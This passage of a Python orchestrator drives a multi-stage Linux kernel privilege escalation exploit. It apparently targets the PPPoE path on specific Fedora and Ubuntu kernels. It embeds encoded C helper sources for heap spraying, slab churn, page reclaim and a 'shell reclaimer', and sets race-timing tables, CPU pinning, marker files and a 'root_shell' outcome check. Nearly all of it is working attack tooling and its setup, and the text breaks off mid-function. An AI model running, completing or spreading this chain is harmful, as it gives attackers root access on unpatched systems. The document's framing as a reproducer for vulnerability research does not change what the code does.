qy~Gylu_z$g1R*+mj$9zSF?mw_!E#wdI?ra#WOF4Ixp4peoe|6>Q@tM$S-)ff4TKl!_D~PSmb?HqvCm=J*Ej{eWU1tZ?zMJf$Di}6FaTvaDBpRM!Ak%+A0^;V%~caOMG#$e1T{G-f;&$E;MK0oxP5`%#uyYALTi%_awl<7mMTdHjPp0wiV>FFtp@}G2cXmWL_8kGz$>P(=?&4K!RCfl`0BgQ=FuhkP#`S7T>*UP!(2?f-J4-URh-e@}gQrw1tEmw_2@q%(Dm>7T*pgAOqGiCHwJaJ*BD&A?Pe=!E3KgKv0NX_wWjxz*e?NmZ=!R3$674&xUl&Q@S9}&21AuXK)%?Ht0;0RP9|#A-ZtgBr5_jq(LMM)L}3X{?Whr<!s=RQgZ%gG5;Tg$s~tyI?Sk_X5j-OcjgobLvo1n0PxGQTZA;4gR4a$fFM}oUf&Jib=pBrqs74nObd>@mc!6CKUg~LJdMJ_R^mgb$*Hk=(owaDq~bfQ4ajKDZrWZUcLZGk=;KA4aKkXpLqx;Lrr-}V+$M$s*eG8H(jp{hIF0f>pkBoCk|R!pD-?zaTI`I6@0=v`c3H2k5?0)Wv(M5IJN#rM%sISIxH$x|+7Dh{WdF>G5I%b)O8AyyP1n`!%5{l}xSYS|xZh||7URn@%n8yyC|wo!ZFvo5aDu2JW5_z0{sDTfx+r6%>5_o25(S%hwvx9{w)p1WZd6hEYm_YI<1F3i%6vn`sdQ(iqz|*mPbJBsIA$w=3xEoO#R3l+TRf>h!O$;!p155;HEx>Qx0u>Ku{3oLK^z$XmEc!nF^C51Q+36xt12NJ)nHE|Pd-i|K~6V|1<k-8dSC=_Xcd!7d0a4oIIhA`9mSz*OR1uYXAt1RIo>NW#Hp&t_jPPc<A)xI2fo5AiQBUz-P%qQga!}j8Js{eySW<-8b^XF_V|_>yTKq$O5@4J@NQBc$+8k;jGSE*x_dw<ztxm3Bk7`*2zPn5Oi)o$@KPo5Hd%N_xntzu=1!EEKe5%Y9w$MGf%Q4_ctd~qL(44p@he@k+GpUT6u{3DyBLyo0#S<@D7)^FGJs)U#0tG9{*7#ywc~XV#&#LwiEy89bG(v#U~%dPjH0sT)8V~JmR6K}25DJ{vMnP&LX0$V6+3Kf_{|4q{dT$~*TcJ;$?dRzGXdFu{tGFPu{Zh!Hh+G5rv!n|R+*6O8VoPxFsp1Ki!h=+<d++q?lb}@2PTItS$x`;S9xiiB?w=JB~TjfQAy?Ko@Ff&9Qcj<uCd3)Sfh{#0qPTs!#oX-whCNJGjKU7)M<vKJ`^p~mu+ytLLx&xW@B}hp}>-O<Qx^8C6G`XI=L@xe8;HQ_lPp`BzmAW)?H?W_!)pvS2NavgK|dWq8;Y`Jj}pMVN+&z{mQq*b(tViL9^gwumi*!%+OJ!pjhVo%^&`}iy{INyliHsUoG#uyGr)DgZ)%Rzp_eueHzPWjm;1d#2H{uA(h>RZ(_VCwQIG~_aK3rq<9bTXztaErK%WSMddYBcK4~0Lx?v2vc=oDe>w3+*KQN)*gp+I#GYA|Gil?|qU@FY7h|XTmt*Y-dxF{3CavWHwoQv(8O&%cL2usEhNPD!2Sk+zUDJGB(-n=RI}hkOiH)?^#C)6m1W4$2C&1AGLf{-`faNPBmP<H5P7xsMi=#5asa*}YrGx;$TO<K9=Qe>tBS}bWt6f^ujC#kB(YPR~lGuH^6)xRrwID+HEX?~p+ko$5KJ<Od1h(TXaJ}{(0Z;I3>9qa_nw1u2',
    'h316_skb_slab_churn.c': 'c-o~`-E-PF5PychLZwq;61O2qrw>ii8=5*jrqpzRTtBWi8e_|#iIF_EoF;ee|9-oY{DGl;xZ?q&)k^!@@8xmCVlEh=Z~YrOpWe)_yl(d~7hzIFj9joR6Y|;mRfCjpQQRL3reJZqeUyi57PUw!T1uJh5V=shG`T}c__9sQxLCDl5BYH}!&|2I&{fc)D!yUcltOS2g|zNtYmS*Wdh?ln7%hG$y<@dWkJo1>FKEVs=%LqOns}qRw}&lZLC$*JE=uPip}x$RDl$RtB#%hMnG;HpD-y1Qj2v!Qo(C&7=>F5~q+oHGIVI`5+hO-yIo_x7f?kitlbe|b#2?kuU`LV$S<Wb|*otLaFDrJhT+OrLf^UkA-30fz(E<%46A`&2{>@|p5)&y_<Ss}GcHRZ~7y@uOgcD7KHF!bE#4*qJ;j&9kh6t9&#4#5h!42~LJJBy+5@f}#mIP-9Uxx>{H!oh4_<+>y5cnASs~T#@7~&MASYtY%%fRBSErQ`j(v05)iqRrx85IGTGYvvUGbxpWKG3RPk0%~jKS)yuDbOmGDHBfbIL%~uoU<f8E_g)Yyyuc$#(F5a5IJ8777=YE{l$S4vHfSVP(MEmWg!$CX~duhkI>#|!U~h|32JY3j)Np;#uFS}7Uy9g;_?FEe3B#uslEVt-{6CV1>?eN#C-Z1!T{x*k$&H*g4-c(?FHjY*lTV)J%Js(vI0yzat74}Ah4POFyk<hIV<5cd}r0I-KH}Gm}r<5=vV^3CP34I=1fsV;2RBe_2Gto@n%z}4+MM?33G4Z04Hc^iD*V$kMMF3L&9?P;0#@o^S_yl9b~iIT0gWgCT0&Xko<P}G*5yhXe=VGxD+hw?d08BCK0uTkiwPR;6@|4HZdO(8ANpXpjd85hie9xz_403$fF_z#h`cvQ3R2ikR=xp#SK&d@GmfRo{5CU!G<RfKp0(9-&;(^{yWzmtuk4p$a?~mALn~tjaaU@2vC#%_-GZsreIjrfMF9Pi3}YF?Ml^POXoq2MkJejwT?2hKoGGET?F=67I6$Is<~0x@bo!3)IXLXV<F>r6@L!(quQV?O=U9vu0Yjkqg|>ILOCGTS*2riMjJTrjI)EZR7Qubfq}(Ow;HEmGcuoEy`!_yNAle)uO?IPlXq2a{i*+Y0t+-Qq@KM-Z|2?%&&zPFWLz}DF@&bmKwk3nsu*Vq0m)QV_Yu#8;>+Fw*K~IE$LpJGi1wzn8)d+zMDuje$_fzE#$bI{A;HLPU~pPt2<GfJgImilB{%48$#}M3eG?1+-y=WshkgGS-Y^^*%!X~iMr8=P<iI~b8~h|GOwc`jrDKgI471WHAg0ew+w42s>LJA*>`&g$-_rMEpDsRs@UYg(Ot(a+GZDMjd103qw$+&J(a}IxfZTuso90EL(2Sssl2&b(RI2RNLR+rWK@4xE{^H|kys)Hwj&IZ-%Vj;^I2a5tk8LIxNSE6s6bFX#?80;$JDpq-?`rD%Gw&Ll_-0@f>|lL3Iy%QC6mpP*lR~HSV_S-S$*G?jy&a8xJ-k#Te+n5iA7CJKmJkHD=XGW@;<M2&wu%ghG@Z~G7fEr(SQ#$3uQ~&G0+)5KtV<yDA2Yvkp*<aBtI)L-`4BdDreo>}(0T#K-8^L>z=2^1i$8g$?x@Itg!NW`NV9D~gVSFHhMt*`^x$iYuFUEJ3?0|5(tu~Q9B6iW-~L)|v^2Sfnqc0aq1hk(YJ3|srlC`KN#h}xttl9d@#o23E`g4Jg60LN`<YG+lN}=F<1Ze0YOd5e!A&a$2c6%@bMjKl-j2=|(-|7}C3yiqx>%_@D438O5%}2E4ay~SJe|CT$~-i)CB~3b|M%D;*8ep$HajWdl(gNRcBhht9*5*~=(gvQK03m@0&cDb;Ti{wmETyeZd018)njdCtR^SJwF$CYTOea_s!*}H4ln9(M|_u0qOSr5)e;5Duydp4ZS@0v@(VdujDEi^)J9IJIWEC+P04Pz?1nAtSPOq!^Mqkj3)Ge~aE8>$Qo|I1ka@yb>hyKe8E5Mtv|1TwHPPDtjN6C-Tw`P&V*dXNw+rup',
    'h318_lane_reclaimer.c': 'c-o~}dvnuB68}5-6oa?O%E1sP1dbz^Emv&7wZTp~P65lMR6-itDr8BgM@VkTcfanQhh`)>z#X+1sb{9ArysxRZtZUYUxqPf?%V05dojD5pN@BTe+y$jDg(}5@hppzC+pV+Y3avBWRs#WE^iK&Wx;Ri1DmkOZCdWHc~B!2fmbA(&~K2xBuUgDhH=rPB@I#(eyP*4FkaPYxB0<l<Hb#Cn)&r}B01xEQf5AHj^u?`v`}wz--}up6}KtRo8)g^SmRQJo7!$=9K!jKw)>m3-(om_J6^bNM(nu%&u5zae)!Qn8&1a;?1iSi9WKW1`Ec=$bq)f4eUPs=2kZWer*6jm$O|{_$}4zBPoIy6qfcsnu}Q_;Wl(ruA`WZ3;I^7PnoY-B=LSh^@I9Z58Z(syX&6)!FUHf6+hqK#@8&!XB-dRqZs`{+Uwau3=m_lZ-5qyGe#J`gnWsl?!B)vh3zbgMI*=rVo3D8kxyhHp195`dwCBe#%}+LI#EUSA-8lcOm40=ydv~Hmi@cb-UY>`mc*ElY#e?-kJ`s<8TB;RZ0sP%*lJTO<Vs@Q`0SiLz_(`0@L^vhe-|#&5R=m3loKlF?By$uA81kF2aK;}e;1t8j+2wo;#5>K}<P&*i3_+Q>saLEW+=^JrtyjF@@wL-AKR=(1;ar!~(|6-}$Kpofc}3y*YZo{dSrP#ztlWZUn=tmGiYXpbQQ3ecDUTiDhDCAP>9LtRAAOj!@9=PXHXDB&pTb74Y{?wG>=o;GcXy<GCt@%t(<42j$1WD5$<%!_IU7%BU0lGvf8X6<@TWO(cDeY;ndAA~oQXo9O*-P_<SdMwg%t@i^q^0STC>mcy2ck+`caZ|J)@~-e#3pYa?DD%_ZdKKobv(@Y!wDhzsK;uE_*OAj<WH-a`PaoEGbhq8RZN-3~&-0w`21vf0|dB^Q?sxo+kn)_!7o|Mc@M+@%uQ1-|6MqnWchSOk`yYFi?OHu5x25M#A_y@jZ-8;eH@?MM80L1GcxvD(dI{6&noL?+3r*NrZaK7}WXISgHg!4S_T|xR6AidYL5~CPZX#h84F%2X8o*W;_MlYMexy);tnMDTIz4wYax}KwwNiWv)U;ERl!({+&fQOw=CR6H|rlwDUi>a3>e@@moiXKFJGrlLWkrt1A*|1s5Jx0m+tLlym7K{yO;<%Z(}zK_>nh_^FZOe>{6uIZus`e1*etQ*nqSpf~WTYc3%=Ol+VDc<yImS|r)eK@B}mXQzwBCyhD=kJq+*)d<?%+=@~p$AXp~d*hBS&)<yHUOo0y#gVaAp-L;a3MPJ$8~UVDmGsImPRrsTDGT_AqOj#qHQWIPKsI!3tGJ4<9DwN7kfV#PcL+gd;A%Bm2W#*Gi=Yl5w<kb(EDk}rpoXJ1z9zN{#udc|`r1Mh>cv7Eq_>G=XteG<+mPN+l&N!_Tx^m!DUvw!-Pns^0boIpSB@^D9<#(e<vxp(Z_0OpzyH;R3mgX>aFx?P-S@NUY%!Zoz-9JeY7Mfj6{cS}N}Mh%dQw~iRQYV59ro29M3zU*X)(-ecv2e1F626n%y|UDr6s~2oELua0H^1d?qB2i%-I71N`i!o@xp<bh+2Y3_YhVTxY%1l!We?@0o3H-e|WOQJE|*Z+b0DXm`qG51#3xYFco)~iA2~s1RJ<qH$m#bRR@v#H&ZHr7pW?Cw-u?stwRvT*@n$1I(b0EdFt%ZCM_4F5IqYE4!8de8~~U$gzs4iAkMo7G{u6M`(Zwto_!L4301*@o)&XR2u%>}ftVCljP;-Q`*bmZEx@o5k5_bc!SUhQp>11m)`Tq|Qu9Jsh;6*=E6;Rn(HX6{MTR}O4e89u#nxR(Q(S3jgXz8DNWSXDK?tQPU|^IKj>_J9G>Fw@z|G9rigySO+HYS@Y+PktmUFjOBjirqOk%GhDZGd#=cI1X_m(1K-(V&@mRR{odMgY8;HL~B$8zr)ofjQT(~9IPk5!eDl<*4<sbPkgi4~RMkVq#sBp@|IL_q?K421;n=w`$OlD=LCy&fd!o-i@zffj{)s<99Ut%Y5ztc2V}=7pFC!(y}6s){XqrW4SS21dP%mjmsXL;W5vg}|`S!{Ft^;GvJZ3ES@pJW^Yc-yK!UNd=;;5YLcB80Mo?C@pp2L2Hlz(<I<sO#T{+Gwm!h&Ph|KN1cc~KE$^>_)DtA!-a9cZ^%aS@s%)}e0}stGQ`6h_W4YsS5HXL!9WO1Vv$@eGf`BSh$t>N)@8JXBq{N)$%-UXn`#@i%%IJL;lRL1d-Mn%fuFUh+)*2~&;Eez*-NQ{?ZpHJTe;z`j&rA_tFVv1JsS^15RzM|?1+L*+|mM9^kju!SXg86RH3^|HG5y2p_XiEz9(4dVf(=qGx$v!g+8p?L%|-uZfRNc*r9>S8@@@hTQ|u9C>}B%aW5yCf;58zEbDn|XO0ydj9tS;vI39w{C}4rsN)2$uB^cN))U8m@~^nFtuUf8WJ{UTtsPz^tT@?BuGXN!WV!78s31fa`hn>x+{W;&lw&}-gmu%NmeJ7_?F&ILl^20TOVKTqFJLP#&Y^rn<Ppw6ZARyOj*;$8hwsOr@ia{n{+O~7D2^`AYCp(YrBE1nc*D{zc9j#CQ6$Tp>fY8p6_GiKW#)y840K{7#*NF-%FIowk!YJ_Bi~gOp;q53cGN$9fwec>K~JSDJtL?Lc`-z)0Mg!a^wbE4B`^H7>jgnGB(S}QL9o^LW$Gn4MTysBvPx>pWgJj-(--JRIu#9H=i<|aOD*x9$cm|-xZgFny}4YBKe``=lLZ#X$_K@LCVu;(BLym=Mm%a^JbXKxOl{I+x|pL<lvXH+?l2CeyP2-4^!|s@Gk#eOSH)Ci63wS>5<Os;<oJgOWp_)_&96*&YAtuV_t?%#)9r3CIb#FW1q>LDW`HXI3r6Y&fRk=gFI)LNnSkxX%e7f_HNd6H?KArJ!RWW5*3&cdk~7=J5Z?jzmBB58jK}sE2_y2>&qvRmUrBHw#hg@4<y<}+*@nU-nSs&^itR1~H6%5mUIAHCcL}LY2{)2R`e<P3Aya#xey!2f3y!)XxHs;(wx%8G8ERy_t5M6?gnOxq8<D2q1mN%#Qzp%FAlpgyu11&U2$qv(Kt}M&&>`-JSBk9|dmu&CZ-+G&X392@(`0J#0t7vVDQa*_CQthwUG=Qw-E;sYk>K;HA%d`4efMXFN3j24|LC|%D}?Vk^RvnO30x{OL}1KUky<N*5gGyRg`euuir$_e8`m$PARAOzA%Lzn!5D`+hcdkuHm{jM*myTaj{UPTOQF3G>T64CKs(u^)t|SJENRs@EQ4r)grupDQgo-vP(YJ5`iwY1Mvl65^~QE<QCG_2kEdr=p{(m;GMi-9Qv8~23JO<krzN0D>?=rv<vslT_q=9ftbw;MS&2Mmv++_{Na6Y(JD<-ME@}+~rsogy$pY;0et7O)yc^EPqaM>+T4xYd)H!{08jp-`0qGVI0M^0$5|jJ#0IE#fQp*T1vuhcRm7+4i#%Yp$B}2(pv_1aH^eCL#Xa}{gQ~0u@Gfg4-mNH7#=k29aPp6t@dVi-9D3kaT8H!AE+LM$AgI$&4>U5+_dc?z&qN#K!`!%sF1;izzn`z>;i&bzGK&}s&O_V^%3y_l{_L7{n&XbC$p1iSshCiZ0=Uaj=`QTx|pv-_Rz}N8Q3tandz$5P#vWG#R<*Dc6r!IU!nQ*ZL*9x>+1gkK?6z%^{1Wj$~Jo}e(!apI{Agy!Z;_vNlOAM=i7Jg|n-Ph=}{6Ywc+(5J=tA+_)obA4?`zM%!p$F7rMK>_jm!H~r6@SQJOZ<J9yuq*7<B_A9p>R)sK+?rxxVXH~WY9h&pUBeATBt{`!y~vdkl%wQL&zW680t&MPId%8>A@XSXmro2BoyvyCA))%QB*1?6@Ns{cwZrDOm@l`4Z-2&gSexgZmX*r1?@dace@))2>R6^wUv$(TWv_GdIE!oIqMLMAH}l@W}824Z*M@Pd-1WQGa|dEjlPJ1o0MjCZXu>1(dxuWrwvVXGGT%VrLF&yK=;T3-e3Flt6HQYh}*s`?CiAt{~m20kyR0k-yqbW@f|{?^wlR|{H!gh(obujjM*N;Z^@UFkr7ein}4-I^`uh%yWQ$LuvKbEgJ9O{)XNhw)W?LFO1b|6=;}r(',
    'h321_prime_pcp.c': 'c-n<kYj2xK6#Z;|#jPW4ah7g~lek+su7n)wTJlSNv`tbA5g6=IFrWdaNt^xed+!Wjo1|(!#LSsH=f2L|Ir3S+BL+@yv~XtQ#k6Z{+7XYuaO*R;WI{yoKkJWsP~b&bcnGE5n)wxouOhc<miat>0fqdof<2`tn~fVCqT7h0F=5(K9`nGO_H1X;pV-c<e`CX`dH(Ok`&PL>8(M?G-hS)i;%v7&nf8Zx+UnUeXyVCoV`^Jh*SInN4E2+2lbo#2nx~FnuK!fuaZje!p^<t1!ATS0KD}-_n_CoYg;gC$Gk3-6nufm__rMv&f@NC~!9&b_@Hx}HI7&0{)~<l#4NFtBZ)m@?T7nIVg<e2yt;QaCrrY28bLW%QA1tOeg8!A&k}%<s<0V_2M@X4$B@zBQDa)J;@PAv=YTe1gxv{5X{VxQFn1Go**U{2|0^|Ycvio${4KQDxJ?W+aDgVjhKqs@@8s2okY-qI_<x|HPVA7pHBKU^EnuVB2{UB6|E^$T5WUTuI$k=11f|g4b`OtyUVlcpf!Z=#NgBxxcB_ZXDn<nl^5Wmw*WO1ky2}Xv84HQn1i#kA&!t*mo<_?f4Eu|;id;8sdOKZh=DQ&eH;GaT1b|5bn$&ON%O=*&oys=dKMjmFRJ08j>W6s7E_e>n*ow(Ur=1ryXS?UR%WU;`U;)F#yZ5uFlzD~!Z!8JVNXBV|RmtXVgV$@aGU~GT0y9S0OV+Jr=CKW(cV2@X220sMP*dA^`T`K&0R5zd{``Rk|s-oX(t;&O1Tl2y=-6vA*reroQkE9%3vGR;O-D6xls6NXgkfa>4O;9{5hnASSuHeT0bv}l3^FwQaF1Ha4BIXxYN1bh}5+*!hPT;4v&1Hd5$fUPojlrv>Dh`E5`JPc-R@h4J>kX2KnFDNxP)YJ`H<7NS#+Y}qrW9{amsFj?*USCpvXCc5+|-M>ja@e@x9de0=t#X_krTXRxiyytd?K}~NqJ*b2dgBnVuh=fh=081C@(c;gR?x*>3SLmy)$qEkLM0eThyie{yOc?Z4#!^B@C^JgMIyC&22QHl{FfVu7~5r%z$^N29)=<^wyDPH2UnTGDh6p4-qG2THl@YA2`Y~XQ;+Fw64B5qw(iO&n9hE>g@B>y$f-EZC5!j1bA^uU(yR9xk@1p0-S|%A{F142OdlK?~W2N`N|D$)z*@ZKc2sr@(y`)ukT*0#ty7LJMsn|%$7e}91<7rMk(d8hTDjG{Avj+6%#CEZpwb!jz4O%@~BJtDpoji#Ri=)kNKpHHD9gY#lmL-0>O6IL9oc(uou-Z_TKp4ByktU-aQVN6dwj;b%Tsmn_t!}zul!%mqa(~_h$3)r200Z?W>QYl2W@(mWjJX0y#qe2fqIROa',
    'h322_drain_worker_pcp.c': 'c-oa!ZExC05dMsR#g<5|Nt_EI3B41cl0{sKM6hL`ZIVVS*Ir;%V_R!GFKzPQZ)Vrn;6%|Kio)*9?94nf&kTD3TkwbxI-Jbu)SkNoOVjpv<cE2{$T<@tivL=D+7d1NC<}K*slQ@DO~jXxS2xQ79={NU{AW$}m>#XyUbHLCBM!zW)Aov-$EG{9s55dbIvrhG<hXtM_u0p8sh?h&<MEchdv<nGX)j!JG@*_;w5FtUR>@t<yto4S><eigW$WZ<b<*ij!MxzHscC8EW!xup5(}2)A|iJ&4@kh7?#EG@5r5?gvcG0&>MdDI`=d1ys9`Mhji{$J*aOdW>-%U%KbxcR+_gaXT)O5_MiNh?jQUBw<27RsnRKbHEDA`UOy=V;_zdG{N$$KbXFUxfVB0|128|TLIn6{ChdMej$a{EfK*2B_z971K@D5&(rzavk_X(QfRYn5chac?^cvl|JrLEQ=@KKUaeKK%>Mb-?<-O?HgX$ON8)zSf7t4OngENhtXNFql3@U4I*IZatcGXnn+82Z1qTw8w+0`yx1)WH%^6+%QLIf;+G1+<lCk9yl6DgVvlg^p&0wZx36Vhfv)1G$gIFD4G1fkOh}fndc#=wY+<B4Zy&kugOLy7usyjtZGN!U$OE3!Y@LfcnP?i}Z?I2E?@KH`ktwugDXz=>T*yd78QN$w0}*w)Nc_7^K~8W3LpnEw`!(<X-TMZOIMNlv(|Vng;1gklhlbO8X^Fg#d9j{4h?p{VD7SX$_XLMV?stMnTMdxZJ6RNxEX0DcUAb&?Uty6hK$v*7o4-lhgJ;-8qEJBU~9Q*i4Xm+f#*1c*4?~&Mo{E66p6v2WeAzRn@`75by~WW(l<8f!;zow+jKQBv_MznVp`b8{}CHAHuphzQu}cqP*01q<#U-kagivz#io26~}XMt&Rr=Edn)?St6p2u5d}^tx@&6V&&T%!{@SJ(xqI?J1%e9;Po@khgyQyMtx^uBzTT9T-TJ*mm<D@Blfe_D4GSRVQ(iot|Vip`v!4bdq$D{z-xK_=8k5TQN)JNrRh+|9ep)t7MS48oY<4AOM5;w$l)=Jz-F?`XnkphJJh-;*$vuPl7-EiHY*3g9S43Fj_RpinipT`#QriLT1e8`iU@e>{R|md<x8gg66}3FWV0kiF%0oy0sBS~qd1@M1TMt~eKiyqvM{(&s#|>iaQab>OUR>NTl++g?JEmOlDAl`xK=kc$Rljkt0kx*7A$05%HFE#|7HJwqH68udyA@dO-WVA!{14C#h0tYSOiRLwdJ|0$Y!iJWdR!?#&k5C&TOat;{djA{W_>B^m_Op@pAAZ*XF-4Hs8?',
}

SOURCE_NAMES: tuple[str, ...] = (
    "h210_kernel_text_locator.c",
    "h209_vmalloc_carrier.c",
    "h211_shell_reclaimer.c",
    "h050_team_ip6gre_offset48.c",
    "h113_raw_fuse.py",
    "h316_skb_slab_churn.c",
    "h318_lane_reclaimer.c",
    "h321_prime_pcp.c",
    "h322_drain_worker_pcp.c",
)

H209_READY: Path = Path("/tmp/h209_fake_ready")
RECLAIM_GATE: Path = Path("/dev/shm/h083_reclaim_gate")
FUSE_READY: Path = Path("/tmp/h083_fuse_ready")
FDTABLE_READY: Path = Path("/tmp/h083_fdtable_ready")
FDTABLE_DONE: Path = Path("/tmp/h083_fdtable_done")
SIGNAL_ARMED: Path = Path("/tmp/h083_signal_armed")
SLAB_CHURN_READY: Path = Path("/tmp/h316_ready")
SLAB_CHURN_RELEASE: Path = Path("/tmp/h316_release")
PCP_PRIME_READY: Path = Path("/tmp/h321_ready")
PCP_PRIME_STAGE: Path = Path("/tmp/h321_spray_stage")
PCP_DRAIN_READY: Path = Path("/tmp/h322_ready")
TRIGGER_START: Path = Path("/tmp/h350_trigger_start")
TRIGGER_STATUS: Path = Path("/tmp/h350_trigger_status")

ATTEMPT_MARKERS: tuple[Path, ...] = (
    Path("/tmp/h049_fuse_blocked"),
    Path("/tmp/h049_fuse_release"),
    Path("/tmp/h049_spray_ready"),
    Path("/tmp/h050_send_done"),
    Path("/tmp/h083_fuse_blocked"),
    FUSE_READY,
    SIGNAL_ARMED,
    FDTABLE_READY,
    FDTABLE_DONE,
    Path("/tmp/h083_reclaim_pid"),
    Path("/tmp/h113_seed_now"),
    Path("/tmp/h113_seed_done"),
    Path("/tmp/h113_seed_refilled"),
    SLAB_CHURN_READY,
    SLAB_CHURN_RELEASE,
    PCP_PRIME_READY,
    PCP_PRIME_STAGE,
    PCP_DRAIN_READY,
    TRIGGER_START,
    TRIGGER_STATUS,
    RECLAIM_GATE,
)

MINIMUM_CPU_COUNT: int = 4
FULL_CPU_PLAN_COUNT: int = 29
MAXIMUM_HIGH_WORKERS: int = 96
HIGH_WORKERS_PER_CPU: int = 4
SLAB_ATTEMPTS_PER_CARRIER: int = 256
LOCATOR_TIMEOUT_SECONDS: float = 90.0
CARRIER_TIMEOUT_SECONDS: float = 900.0
SETUP_TIMEOUT_SECONDS: float = 45.0
PRE_SIGNAL_SETTLE_SECONDS: float = 0.015
SAFE_PATH: str = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
INTERNAL_ENVIRONMENT: re.Pattern[str] = re.compile(
    r"^(?:H[0-9]{3}(?:_|$)|PPPOE_)"
)
ASSIGNMENT: re.Pattern[str] = re.compile(r"^([A-Z][A-Z0-9_]*)=(.+)$")

ORDER4_REPLY_LEADS_NS: tuple[int, ...] = (
    125_000, 120_000, 130_000, 115_000, 135_000, 110_000,
    140_000, 105_000, 145_000, 100_000, 150_000, 95_000,
    155_000, 90_000, 160_000, 85_000, 165_000, 80_000,
    75_000, 70_000, 65_000, 60_000, 55_000, 50_000,
    122_500, 127_500, 117_500, 132_500, 112_500, 137_500,
    107_500, 142_500, 102_500, 147_500, 97_500, 152_500,
    92_500, 157_500, 87_500, 162_500, 82_500, 77_500,
    72_500, 67_500, 62_500, 57_500, 52_500,
)
UBUNTU_REPLY_LEADS_NS: tuple[int, ...] = (
    120_000, 115_000, 125_000, 110_000, 130_000, 105_000,
    135_000, 100_000, 140_000, 95_000, 145_000, 90_000,
    150_000, 85_000, 155_000, 80_000, 160_000,
)
FEDORA_REPLY_LEADS_NS: tuple[int, ...] = (
    160_000, 155_000, 165_000, 150_000, 170_000, 145_000,
    175_000, 140_000, 180_000, 135_000, 185_000, 130_000,
    190_000, 125_000, 195_000, 120_000, 200_000,
)


class ChainError(RuntimeError):
    pass


@dataclass(frozen=True)
class Programs:
    gcc: str
    taskset: str


@dataclass(frozen=True)
class PlatformPlan:
    distro: str
    label: str
    carrier_prefix: tuple[str, ...]
    namespace_prefix: tuple[str, ...]
    fuse_namespace_prefix: tuple[str, ...]


@dataclass(frozen=True)
class CpuPlan:
    available: tuple[int, ...]
    carrier: int
    high_sender: int
    low_sender: int
    high_workers: tuple[int, ...]
    high_worker_count: int
    low_workers: tuple[int, ...]
    low_fuse: int
    high_fuse: int
    high_trigger: int
    release: int
    orchestrator: int
    low_membarrier_order0: int
    low_membarrier_order1: int
    parked_helper: int


@dataclass(frozen=True)
class Helpers:
    locator: Path
    carrier: Path
    high_reclaimer: Path
    trigger: Path
    fuse_server: Path
    slab_churn: Path
    slab_reclaimer: Path
    pcp_prime: Path
    pcp_drain: Path


@dataclass(frozen=True)
class CarrierGeometry:
    order: int
    target_fd: int
    corrupt_fd: int
    sid: int
    payload: int


@dataclass(frozen=True)
class ReclaimSummary:
    workers: int
    setup_failures: int
    fatal_failures: int
    root_shell: bool
    base_delay_ns: int
    spacing_ns: int


@dataclass(frozen=True)
class AttemptResult:
    success: bool
    safe_retry: bool
    detail: str


@dataclass(frozen=True)
class TimingProfile:
    reply_lead_ns: int
    worker_lead_ns: int
    pulse: bool


@dataclass(frozen=True)
class ManagedProcess:
    name: str
    process: subprocess.Popen[bytes]
    isolated_group: bool
    log_path: Path | None


@dataclass
class RunLock:
    path: Path
    descriptor: int
    uid: int

    @classmethod
    def acquire(cls, uid: int) -> RunLock:
        path: Path = Path(f"/tmp/pppoe-root-{uid}.lock")
        descriptor: int = os.open(
            path, os.O_RDWR | os.O_CREAT | os.O_CLOEXEC | os.O_NOFOLLOW, 0o600
        )
        try:
            status: os.stat_result = os.fstat(descriptor)
            if status.st_uid != uid or not stat.S_ISREG(status.st_mode):
                fail(f"unsafe orchestration lock: {path}")
            try:
                fcntl.flock(descriptor, fcntl.LOCK_EX | fcntl.LOCK_NB)
            except BlockingIOError as error:
                raise ChainError("another reproducer instance is already running") from error
            os.fchmod(descriptor, 0o600)
            return cls(path, descriptor, uid)
        except BaseException:
            os.close(descriptor)
            raise

    def close(self) -> None:
        try:
            opened: os.stat_result = os.fstat(self.descriptor)
            try:
                current: os.stat_result = self.path.lstat()
            except FileNotFoundError:
                current = opened
            if (
                current.st_dev == opened.st_dev
                and current.st_ino == opened.st_ino
                and current.st_uid == self.uid
            ):
                try:
                    self.path.unlink()
                except FileNotFoundError:
                    pass
        finally:
            os.close(self.descriptor)


class ProcessRegistry:
    def __init__(self) -> None:
        self.processes: list[ManagedProcess] = []

    def spawn(
        self,
        name: str,
        command: Sequence[str],
        environment: Mapping[str, str],
        *,
        log_path: Path | None,
        isolated_group: bool,
    ) -> ManagedProcess:
        stream: BinaryIO | None = None
        try:
            if log_path is not None:
                stream = open(log_path, "xb", buffering=0)
            process: subprocess.Popen[bytes] = subprocess.Popen(
                list(command),
                env=dict(environment),
                stdin=subprocess.DEVNULL,
                stdout=stream,
                stderr=subprocess.STDOUT,
                start_new_session=isolated_group,
                close_fds=True,
            )
        except OSError as error:
            raise ChainError(f"cannot start {name}: {error}") from error
        finally:
            if stream is not None:
                stream.close()
        managed: ManagedProcess = ManagedProcess(
            name, process, isolated_group, log_path
        )
        self.processes.append(managed)
        return managed

    def stop_all(self) -> None:
        for managed in reversed(self.processes):
            stop_process(managed)
        self.processes.clear()


def breaker(description: str) -> None:
    print(f"\n*** {description.upper()} ***", flush=True)


def fail(message: str) -> NoReturn:
    raise ChainError(message)


def clean_environment() -> dict[str, str]:
    environment: dict[str, str] = {
        key: value
        for key, value in os.environ.items()
        if INTERNAL_ENVIRONMENT.match(key) is None
        and key not in {"LD_AUDIT", "LD_LIBRARY_PATH", "LD_PRELOAD", "PYTHONPATH"}
    }
    environment["PATH"] = SAFE_PATH
    environment["LC_ALL"] = "C"
    return environment


def require_program(name: str) -> str:
    path: str | None = shutil.which(name, path=SAFE_PATH)
    if path is None:
        fail(f"required program is unavailable: {name}")
    return path


def direct_user_namespace_available(unshare: str) -> bool:
    result: subprocess.CompletedProcess[bytes] = subprocess.run(
        (unshare, "-Urn", "/usr/bin/true"),
        env=clean_environment(),
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def detect_platform() -> tuple[PlatformPlan, Programs]:
    try:
        release: dict[str, str] = platform.freedesktop_os_release()
    except OSError as error:
        raise ChainError(f"cannot read operating-system identity: {error}") from error
    distro: str = release.get("ID", "").lower()
    kernel: str = platform.release()
    supported: dict[str, frozenset[str]] = {
        "fedora": frozenset({"6.19.10-300.fc44.x86_64"}),
        "ubuntu": frozenset({"6.8.0-124-generic", "6.8.0-136-generic"}),
    }
    if distro not in supported or kernel not in supported[distro]:
        fail(f"unsupported target: distribution={distro!r} kernel={kernel!r}")
    gcc: str = require_program("gcc")
    taskset: str = require_program("taskset")
    unshare: str = require_program("unshare")
    require_program("ip")
    if distro == "ubuntu":
        if direct_user_namespace_available(unshare):
            print("namespace: direct unshare -Urn works", flush=True)
